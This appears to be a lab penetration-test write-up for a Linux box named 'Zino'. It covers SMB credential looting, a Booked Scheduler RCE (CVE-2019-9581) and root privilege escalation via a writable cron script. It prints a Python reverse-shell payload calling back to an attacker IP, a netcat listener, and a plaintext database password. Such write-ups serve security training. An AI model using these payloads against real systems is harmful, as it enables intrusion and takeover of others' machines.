
---
layout: default
title: x005-Zino
nav_order: 2
has_children: true
parent: writeups
grand_parent: DylanGrl Writings
---

## x005-Zino

### Abstract

Linux machine exposing a SMB share with unauthenticated access allowed. 
Log containing password and web application using a software vulnerable to RCE.

Privilege escalation obtains by wrong permission set inside a cron job.


### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.



| Server IP Adress | Ports Open |
|------------------|------------|
| 192.168.87.64    | TCP : 21,22, 139,445, 3306, 8003     |
|                  | UDP :      |



**Nmap Scan Results:**

Using  :
```sh
nmap -Pn -n -p- --min-rate 4000 --open -sCV 192.168.87.64
```
Result :
```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)
|_  256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, NULL, SIPOptions, SSLSessionReq, TerminalServer, TerminalServerCookie, oracle-tns: 
|_    Host '192.168.49.87' is not allowed to connect to this MariaDB server
8003/tcp open  http        Apache httpd 2.4.38
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
|_http-server-header: Apache/2.4.38 (Debian)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=4/2%Time=624855F4%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.87'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusRe
SF:questTCP,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.87'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLS
SF:essionReq,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.87'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Ter
SF:minalServerCookie,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.87'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:")%r(SIPOptions,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.87'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
SF:%r(TerminalServer,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.87'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:")%r(oracle-tns,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.87'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-04-02T13:56:18
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2022-04-02T09:56:15-04:00
```

**Vulnerability Exploited:** CVE-2019-9581

**Vulnerability Explanation:** 

In order to get the initial access we used the following  vulnerability : CVE-2019-9581. It targets phpscheduleit Booked Scheduler 2.7.5 which is the web application running on our port 8003.

This vulnerability allows us to perform a Remote Code Execution (RCE) then a reverse shell using an existing account.

A public exploit was available in exploit db : https://www.exploit-db.com/exploits/50594.

We manage to retrieve the admin access from the web application using credential looted inside a samba share accessible without authentication.


**Vulnerability Fix:**

The first fix to implement is the protection of the samba share with credential in order to avoid the retrieval of private information from anyone.

The second fix regarding the RCE could be patch by updating the Booked Scheduler application to its latest version (3.2.1 on 02/04/2022).

**Severity:** High

**Proof of Concept / Code Here:**

1. Perform the connection to the samba share using :

```sh
smbclient //192.168.87.64//zino 
```

2. SMB Access unauthenticated provide us the content of peter folder : 

![](attachments/Pasted%20image%2020220402162115.png)

3. From those files we retrieved the password of the admin of the website : 

![](attachments/Pasted%20image%2020220402162239.png)

4. We could confirm by login inside the web application : 


![](attachments/Pasted%20image%2020220402162302.png)

  
5. Using : https://www.exploit-db.com/exploits/50594 we could manage to get our initial shell access : 

![](attachments/Pasted%20image%2020220402162414.png)


**Local.txt Proof Screenshot**

![](attachments/Pasted%20image%2020220402162514.png)

**Local.txt Contents**

`1941bfb5f0b1ef00b84169624409b2f3̀`

### Privilege Escalation


**Vulnerability Exploited:** Wrong Permission Cron Job

**Vulnerability Explanation:**

A cronjob was running inside the host using the root user and a python script located in a folder we had permission to update it. 

The python script could be updated in order to provide us a reverse shell as root. 

**Vulnerability Fix:**

In order to fix this vulnerability, the script used must be protected in order to ensure that no other user could tamper it. 

Further more, the cronjob should run with a specific user instead of using the root one if it is possible.

**Severity:** High

**Proof of Concept / Code Here:**

1. Using linpeas.sh we noticed : 

```
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```

![](attachments/Pasted%20image%2020220402171057.png)


2. The code inserted inside the python script was the following one : 

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.87",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

3. It allows us to wait the reverse shell session from our kali machine using : `nc - lnvp 22` 

![](attachments/Pasted%20image%2020220402174921.png)


**Proof Screenshot Here:**

![](attachments/Pasted%20image%2020220402171606.png)

**Proof.txt Contents:**

`6dbac9164d596b9c82aef6b32cf81883`



--------

### NOTES : 


MySQL password : 
```php
$conf['settings']['database']['type'] = 'mysql';
$conf['settings']['database']['user'] = 'booked_user';        // database user with permission to the booked database
$conf['settings']['database']['password'] = 'RoachSmallDudgeon368';
$conf['settings']['database']['hostspec'] = '127.0.0.1';        // ip, dns or named pipe
$conf['settings']['database']['name'] = 'bookedscheduler';
/**
```

Couldn't be reached from outside and only DB from the app no root access.


SMB Access unauthenticated provide us the content of peter folder : 

![](attachments/Pasted%20image%2020220402162115.png)

From those file we retrieved the password of the admin of the website : 

![](attachments/Pasted%20image%2020220402162239.png)

![](attachments/Pasted%20image%2020220402162302.png)

Then search for an exploit of the tool we found one in exploit DB giving us the original shell access : 

https://www.exploit-db.com/exploits/50594

![](attachments/Pasted%20image%2020220402162414.png)


Using linpeas we noted a cron job running as root :

```
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```

![](attachments/Pasted%20image%2020220402171057.png)

The content of the script could help us to get a reverse shell : 

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /var/www/html/booked/uploads/reservation/* ')
except:
        print 'ERROR...'
sys.exit(0)
```

We could update the content for the following one : 
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.87",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

